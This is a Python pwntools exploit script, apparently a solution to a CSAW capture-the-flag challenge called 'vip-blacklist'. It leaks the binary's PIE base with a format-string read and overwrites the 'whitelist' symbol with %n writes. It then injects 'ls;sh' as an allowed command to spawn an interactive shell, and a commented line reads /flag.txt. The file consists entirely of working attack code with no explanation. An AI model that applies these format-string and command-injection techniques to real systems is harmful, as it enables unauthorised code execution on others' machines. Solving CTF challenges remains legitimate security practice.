#! /usr/bin/python 
from pwn import * 
from ctypes import CDLL 
from datetime import datetime 

context.update( arch="amd64",
        endian="little",
        log_level="debug",
        os="linux",
        #terminal=["tmux", "split-window", "-h", "-p 65"]
        terminal=["st"]
)
to = 2

global modified 

#ru = lambda p,s: p.recvuntil(s, timeout=to)
ru = lambda p,s: p.recvuntil(s) 
rl = lambda p: p.recvline() 
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
ib = lambda a: bytes(str(a), encoding="utf-8")

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        b main
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote("vip-blacklist.ctf.csaw.io",9999)
    else:
        return process(binary)



def exploit(p,e):


    ru(p,b"Commands:")
    sl(p,b"%28$p")
    print(ru(p,b"Executing:"))

    leak = int(ru(p,b"...").strip(b"..."),16)
    e.address = leak - (0x1409 + 88)

    log.info(f"Leaked pie base {hex(e.address)}")

    fmtstr = b"AAAAAAAAAA%15$n " + p64(e.sym["whitelist"] + 0x14) 
    sl(p,fmtstr)

    ru(p,b"Executing") 
    sl(p,b"%8$n")
    ru(p,b"Executing:")

    ru(p,b"Commands")
    sl(p,b"")

    data = b"queue\x00clear\x00exit\x00\x00ls;sh"
    sl(p,data)

    offset = 14 
    offset += 4

    ru(p,b"The valet has arrived")

    sl(p,b"ls;sh")

    #sl(p,b"cat /flag.txt")
 
    p.interactive()
    

if __name__=="__main__":
    global modified 

    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)

    #modified = send_key()

    exploit(p,e)
